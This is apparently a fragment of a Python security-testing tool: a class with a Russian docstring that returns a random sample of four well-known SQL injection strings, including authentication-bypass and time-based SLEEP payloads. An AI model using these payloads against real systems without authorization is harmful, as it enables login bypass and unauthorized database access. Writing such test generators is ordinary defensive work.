import random

class PayloadGenerator:
    def generate_sqli_payloads(self, count: int = 5) -> List[str]:
        """Генерация тестовых SQLi payloads"""
        base_payloads = [
            "' OR 1=1 --",
            "admin' --",
            "\" OR \"\" = \"",
            "1 AND SLEEP(5)"
        ]
        return random.sample(base_payloads, min(count, len(base_payloads)))